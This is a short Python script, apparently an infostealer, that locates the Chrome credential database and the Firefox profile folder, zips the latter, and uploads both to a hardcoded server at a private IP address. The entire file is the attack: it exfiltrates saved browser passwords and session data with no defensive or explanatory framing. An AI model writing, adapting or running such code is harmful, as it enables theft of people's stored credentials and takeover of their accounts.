import path_utils as pu
import requests as r
import netutils
import shutil

recvserv = "http://192.168.0.6"

chrome_creds = pu.get_chrome_path()
try:
    netutils.send_file(chrome_creds, "chromecreds.sqlite",recvserv)
except Exception as e:
    print(e)

firefox_creds = f"{pu.create_tmp_path()}.zip"

try:
    shutil.make_archive(firefox_creds, 'zip', pu.get_firefox_path())
    netutils.send_file(firefox_creds, "firefoxcreds.zip" ,recvserv)
except Exception as e:
    print(e)